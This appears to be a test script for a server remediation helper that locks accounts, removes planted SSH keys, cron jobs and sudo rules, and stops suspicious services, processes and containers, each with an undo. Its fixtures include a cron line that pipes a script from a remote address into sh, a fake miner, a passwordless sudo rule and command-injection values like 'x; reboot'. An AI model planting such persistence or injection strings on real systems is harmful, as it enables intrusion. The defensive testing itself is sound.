#!/usr/bin/env python3
"""The action helper on a made-up server: every action, its undo, and what it refuses.
   python3 tests/local/checks/hostact_check.py     (needs only Python; no root; commands are recorded, not run)"""
import base64, hashlib, json, os, subprocess, sys, tempfile, uuid

HERE = os.path.dirname(os.path.abspath(__file__))
ACT = os.path.join(HERE, "..", "..", "..", "scripts", "host-act.py")
if not os.path.exists(ACT):
    ACT = "/work/scripts/host-act.py"
R = tempfile.mkdtemp(prefix="dk-act-root-")
D = tempfile.mkdtemp(prefix="dk-act-dir-")
S = os.path.join(tempfile.mkdtemp(prefix="dk-act-state-"), "state")
CMDS = os.path.join(D, "commands.jsonl")
failed = 0


def ok(cond, label, extra=""):
    global failed
    failed += 0 if cond else 1
    print(("PASS  " if cond else "FAIL  ") + label + ("  | " + str(extra) if extra and not cond else ""))


def put(path, text, mode=0o644):
    os.makedirs(os.path.dirname(R + path), exist_ok=True)
    open(R + path, "w").write(text)
    os.chmod(R + path, mode)


def get(path):
    return open(R + path).read() if os.path.exists(R + path) else None


def h(line):
    return hashlib.sha256(" ".join(line.split()).encode()).hexdigest()[:12]


def fp(blob):
    return "SHA256:" + base64.b64encode(hashlib.sha256(blob).digest()).decode().rstrip("=")


def act(action, target, rid=None, env=None):
    rid = rid or str(uuid.uuid4())
    os.makedirs(D + "/requests", exist_ok=True)
    json.dump({"version": 1, "id": rid, "action": action, "target": target, "requestedBy": "owner"}, open("%s/requests/%s.json" % (D, rid), "w"))
    open(CMDS, "w").close()
    subprocess.run([sys.executable, ACT, "--dir", D, "--state", S, "--root", R, "--fake-commands", CMDS], check=True, env=dict(os.environ, **(env or {})))
    res = json.load(open("%s/results/%s.json" % (D, rid)))
    cmds = [json.loads(l) for l in open(CMDS)]
    return rid, res, cmds


def undo(rid):
    return act("undo", {}, rid + ".undo")


KEEP, EVIL = base64.b64encode(b"admin-key"), base64.b64encode(b"evil-key")
put("/etc/passwd", "root:x:0:0::/root:/bin/bash\ndbbkp:x:999:999::/home/dbbkp:/bin/bash\ndeploy:x:1000:1000::/home/deploy:/bin/bash\nsupport:x:1001:1001::/home/support:/bin/sh\n")
put("/etc/shadow", "root:$6$x:1::::::\ndeploy:!$6$y:1::::::\nsupport:$6$z:1::::::\n", 0o640)
put("/etc/group", "sudo:x:27:deploy,support\ndocker:x:998:deploy\nsupport:x:1001:\n")
put("/root/.ssh/authorized_keys", "ssh-ed25519 %s admin@laptop\nssh-ed25519 %s x\n" % (KEEP.decode(), EVIL.decode()), 0o600)
CRON_BAD = "*/5 * * * * root curl -s http://203.0.113.9/x.sh | sh"
put("/etc/cron.d/backup", "0 3 * * * root /usr/local/bin/backup.sh\n" + CRON_BAD + "\n")
USER_BAD = "@reboot /home/deploy/.cache/kworker"
put("/var/spool/cron/crontabs/deploy", "MAILTO=\"\"\n" + USER_BAD + "\n0 1 * * * /home/deploy/nightly.sh\n", 0o600)
put("/etc/cron.daily/evil", "#!/bin/sh\ncurl x | sh\n", 0o755)
RULE = "support ALL=(ALL) NOPASSWD:ALL"
put("/etc/sudoers.d/90-support", "# added\n" + RULE + "\n", 0o440)
put("/etc/systemd/system/kworkerd.service", "[Service]\nExecStart=/dev/shm/.x/kworkerd\n")
put("/home/deploy/.config/systemd/user/sync.service", "[Service]\nExecStart=/home/deploy/.cache/sync\n")
put("/tmp/.x/kworkerd", "MZ fake miner", 0o755)
put("/usr/bin/perl", "perl", 0o755)
put("/etc/passwd-outside", "secret")
for pid, exe in ((4242, "/tmp/.x/kworkerd"), (4243, "/tmp/.x/kworkerd"), (4300, "/usr/bin/perl"), (5000, "/usr/bin/other")):
    os.makedirs(R + "/proc/%d" % pid, exist_ok=True)
    os.symlink(exe, R + "/proc/%d/exe" % pid)
os.symlink(R + "/etc/passwd-outside", R + "/root/.ssh/authorized_keys2")

# users and groups
rid, res, cmds = act("lock-user", {"user": "support"})
ok(res["ok"] and cmds == [["usermod", "-L", "-s", "/usr/sbin/nologin", "support"], ["pkill", "-KILL", "-u", "support"]], "locking a user locks it, removes its shell and ends its sessions", (res, cmds))
_, res, cmds = undo(rid)
ok(res["ok"] and cmds == [["usermod", "-U", "-s", "/bin/sh", "support"]], "undo unlocks it and gives the old shell back", cmds)
rid, res, cmds = act("lock-user", {"user": "deploy"})
_, res, cmds = undo(rid)
ok(cmds == [["usermod", "-s", "/bin/bash", "deploy"]], "an account that was already locked stays locked after undo", cmds)
for u in ("root", "dbbkp", "nobody-here", "x; reboot"):
    _, res, cmds = act("lock-user", {"user": u})
    ok(not res["ok"] and not cmds and "Nothing was changed" in res["message"], "refused: locking %r" % u, res["message"])
rid, res, cmds = act("remove-group", {"user": "support", "group": "sudo"})
ok(res["ok"] and cmds == [["gpasswd", "-d", "support", "sudo"]] and undo(rid)[2] == [["gpasswd", "-a", "support", "sudo"]], "admin rights by group are taken away and given back on undo")
_, res, cmds = act("remove-group", {"user": "support", "group": "support"})
ok(not res["ok"] and not cmds, "only admin groups can be changed")

# SSH keys
rid, res, cmds = act("remove-ssh-key", {"user": "root", "fingerprint": fp(b"evil-key"), "file": "/root/.ssh/authorized_keys"})
ok(res["ok"] and get("/root/.ssh/authorized_keys") == "ssh-ed25519 %s admin@laptop\n" % KEEP.decode() and oct(os.stat(R + "/root/.ssh/authorized_keys").st_mode)[-3:] == "600", "the key is removed, the others and the file's permissions are kept", get("/root/.ssh/authorized_keys"))
undo(rid)
ok(get("/root/.ssh/authorized_keys").count("ssh-ed25519") == 2, "undo puts it back")
rid, res, _ = act("remove-ssh-key", {"user": "root", "fingerprint": fp(b"evil-key"), "file": "/root/.ssh/authorized_keys"})
put("/root/.ssh/authorized_keys", get("/root/.ssh/authorized_keys") + "ssh-ed25519 %s new@laptop\n" % base64.b64encode(b"newer").decode(), 0o600)
_, res, _ = undo(rid)
ok(get("/root/.ssh/authorized_keys").count("ssh-ed25519") == 3 and "changed since" in res["message"], "if the file was edited since, undo adds the line back instead of overwriting the edit", res["message"])
_, res, _ = act("remove-ssh-key", {"user": "root", "fingerprint": fp(b"evil-key"), "file": "/root/.ssh/authorized_keys2"})
ok(not res["ok"] and get("/etc/passwd-outside") == "secret", "a key file that is a link to somewhere else is refused", res["message"])
_, res, _ = act("remove-ssh-key", {"user": "root", "fingerprint": fp(b"evil-key"), "file": "/root/../etc/shadow"})
ok(not res["ok"] and "root:$6$x" in get("/etc/shadow"), "a path that climbs out is refused")
_, res, _ = act("remove-ssh-key", {"user": "deploy", "fingerprint": fp(b"evil-key"), "file": "/root/.ssh/authorized_keys"})
ok(not res["ok"], "a key file must belong to the user named in the request")

# scheduled jobs
rid, res, _ = act("remove-cron-line", {"file": "/etc/cron.d/backup", "lineHash": h(CRON_BAD)})
ok(res["ok"] and get("/etc/cron.d/backup") == "0 3 * * * root /usr/local/bin/backup.sh\n", "a system job line is removed; the other job stays")
undo(rid)
ok(CRON_BAD in get("/etc/cron.d/backup"), "undo puts it back")
rid, res, _ = act("remove-cron-line", {"file": "/var/spool/cron/crontabs/deploy", "lineHash": h(USER_BAD)})
ok(res["ok"] and USER_BAD not in get("/var/spool/cron/crontabs/deploy") and "nightly.sh" in get("/var/spool/cron/crontabs/deploy") and oct(os.stat(R + "/var/spool/cron/crontabs/deploy").st_mode)[-3:] == "600", "a user's own job is removed; the file keeps its permissions")
_, res, _ = act("remove-cron-line", {"file": "/var/spool/cron/crontabs/deploy", "lineHash": h(USER_BAD)})
ok(not res["ok"] and "no longer" in res["message"], "a line that is already gone is reported, not an error")
_, res, _ = act("remove-cron-line", {"file": "/etc/passwd", "lineHash": h("root:x:0:0::/root:/bin/bash")})
ok(not res["ok"] and get("/etc/passwd").startswith("root:"), "only cron files can be edited by this action")
rid, res, _ = act("disable-cron-script", {"file": "/etc/cron.daily/evil"})
ok(res["ok"] and oct(os.stat(R + "/etc/cron.daily/evil").st_mode)[-3:] == "644", "a daily script loses its permission to run, and is kept")
undo(rid)
ok(oct(os.stat(R + "/etc/cron.daily/evil").st_mode)[-3:] == "755", "undo gives it back")

# sudo
rid, res, _ = act("remove-sudo-rule", {"file": "/etc/sudoers.d/90-support", "ruleHash": h(RULE)})
ok(res["ok"] and RULE not in get("/etc/sudoers.d/90-support") and oct(os.stat(R + "/etc/sudoers.d/90-support").st_mode)[-3:] == "440", "a sudo rule is removed and the file stays read-only")
undo(rid)
ok(RULE in get("/etc/sudoers.d/90-support"), "undo puts it back")

# services
rid, res, cmds = act("disable-unit", {"name": "kworkerd.service", "file": "/etc/systemd/system/kworkerd.service", "origin": "admin", "enabled": True})
ok(res["ok"] and cmds == [["systemctl", "disable", "--now", "kworkerd.service"], ["systemctl", "daemon-reload"]] and get("/etc/systemd/system/kworkerd.service") is None, "a service is stopped, disabled, and its file moved aside", cmds)
_, res, cmds = undo(rid)
ok(get("/etc/systemd/system/kworkerd.service") is not None and ["systemctl", "enable", "kworkerd.service"] in cmds and ["systemctl", "start", "kworkerd.service"] in cmds, "undo puts the file back, enables and starts it", cmds)
rid, res, cmds = act("disable-unit", {"name": "redis.service", "file": "/usr/lib/systemd/system/redis.service", "origin": "package"})
ok(res["ok"] and cmds == [["systemctl", "disable", "--now", "redis.service"]], "a service from a package is only stopped and disabled; its file is not touched")
rid, res, _ = act("disable-unit", {"name": "sync.service", "file": "/home/deploy/.config/systemd/user/sync.service", "origin": "home", "user": "deploy"})
ok(res["ok"] and get("/home/deploy/.config/systemd/user/sync.service") is None and undo(rid)[1]["ok"] and get("/home/deploy/.config/systemd/user/sync.service"), "a service in a user's folder is moved away, and back on undo")
for name in ("ssh.service", "docker.service", "dbbkp-scan.timer", "systemd-journald.service", "x;reboot.service"):
    _, res, cmds = act("disable-unit", {"name": name, "file": "/etc/systemd/system/" + name, "origin": "admin"})
    ok(not res["ok"] and not cmds, "refused: stopping %s" % name)

# programs
rid, res, cmds = act("stop-process", {"exe": "/tmp/.x/kworkerd", "pids": [4242, 4243, 5000]})
ok(res["ok"] and cmds == [["kill", "-STOP", "4242", "4243"], ["kill", "-KILL", "4242", "4243"]], "a program is frozen then stopped, and a process number now used by another program is left alone", cmds)
bak = os.path.join(S, rid)
ok(get("/tmp/.x/kworkerd") is None and os.path.exists(bak + "/quarantined") and os.path.exists(bak + "/program") and oct(os.stat(bak + "/quarantined").st_mode)[-3:] == "000", "its file is moved to quarantine, with no permission to run, and a copy is kept")
_, res, _ = undo(rid)
ok(res["ok"] and get("/tmp/.x/kworkerd") == "MZ fake miner" and "not started again" in res["message"], "undo puts the file back but does not start the program")
_, res, cmds = act("stop-process", {"exe": "/usr/bin/perl", "pids": [4300]})
ok(res["ok"] and get("/usr/bin/perl") == "perl", "a program that belongs to the system is stopped but its file is left in place")
put("/tmp/.y/app", "server file with the same path", 0o755)
os.makedirs(R + "/proc/4900", exist_ok=True)
os.symlink("/tmp/.y/app", R + "/proc/4900/exe")
_, res, cmds = act("stop-process", {"exe": "/tmp/.y/app", "pids": [4900], "container": "abababababab"})
ok(res["ok"] and cmds[-1] == ["kill", "-KILL", "4900"] and get("/tmp/.y/app") == "server file with the same path", "a program inside a container is stopped, and the server's own file at the same path is not touched")
for t in ({"exe": "/usr/sbin/sshd", "pids": [700]}, {"exe": "/tmp/x", "pids": [1]}, {"exe": "/tmp/.x/kworkerd", "pids": [9999]}, {"exe": "/tmp/.x/kworkerd", "pids": ["4242; reboot"]}):
    _, res, cmds = act("stop-process", t)
    ok(not res["ok"] and not cmds, "refused: stopping %s" % json.dumps(t))

# addresses and containers
rid, res, cmds = act("block-address", {"ip": "45.9.148.21"})
ok(res["ok"] and cmds == [["ufw", "insert", "1", "deny", "out", "to", "45.9.148.21", "comment", "deploy-king"]] and undo(rid)[2] == [["ufw", "delete", "deny", "out", "to", "45.9.148.21"]], "an address is blocked with ufw and allowed again on undo")
_, res, cmds = act("block-address", {"ip": "2a01:4f8:c17:1::7"}, env={"FAKE_MISSING": "ufw"})
ok(res["ok"] and cmds[0][0] == "ip6tables", "without ufw it uses ip6tables or iptables", cmds)
for ip in ("10.0.0.9", "127.0.0.1", "192.168.1.1", "1.2.3.4; reboot"):
    _, res, cmds = act("block-address", {"ip": ip})
    ok(not res["ok"] and not cmds, "refused: blocking %s" % ip)
rid, res, cmds = act("stop-container", {"name": "helper", "runtime": "docker", "restart": "always"})
ok(res["ok"] and cmds == [["docker", "update", "--restart=no", "helper"], ["docker", "stop", "helper"]] and undo(rid)[2] == [["docker", "update", "--restart=always", "helper"], ["docker", "start", "helper"]], "a container is kept from restarting and stopped; undo restores both")
for n in ("dbbkp-api", "x; reboot"):
    _, res, cmds = act("stop-container", {"name": n})
    ok(not res["ok"] and not cmds, "refused: stopping container %s" % n)

# the requests themselves
rid = str(uuid.uuid4())
_, res, _ = act("lock-user", {"user": "support"}, rid)
_, res, cmds = act("lock-user", {"user": "support"}, rid)
ok(not res["ok"] and not cmds, "the same request is never carried out twice")
_, res, _ = undo(rid)
_, res, cmds = undo(rid)
ok(not res["ok"] and "already undone" in res["message"] and not cmds, "nor undone twice")
_, res, _ = act("run-shell", {"cmd": "id"})
ok(not res["ok"] and "unknown action" in res["message"], "an action that is not on the list is refused")
os.makedirs(D + "/requests", exist_ok=True)
open(D + "/requests/../../escape.json", "w").close() if False else None
json.dump({"version": 1, "id": "../x", "action": "lock-user", "target": {"user": "support"}}, open(D + "/requests/bad.json", "w"))
open(CMDS, "w").close()
subprocess.run([sys.executable, ACT, "--dir", D, "--state", S, "--root", R, "--fake-commands", CMDS], check=True)
ok(not os.path.exists(D + "/requests/bad.json") and not os.path.exists(D + "/results/bad.json") and open(CMDS).read() == "", "a request with a bad id is dropped without effect")
hb = json.load(open(D + "/results/helper.json"))
ok(hb["version"] == 1 and "stop-process" in hb["actions"] and hb["undoDays"] == 30, "the helper reports that it is there and what it can do")
ok(oct(os.stat(S).st_mode)[-3:] == "700", "the copies kept for undo are readable by root only")
print("%d FAILED" % failed if failed else "action helper holds")
sys.exit(1 if failed else 0)
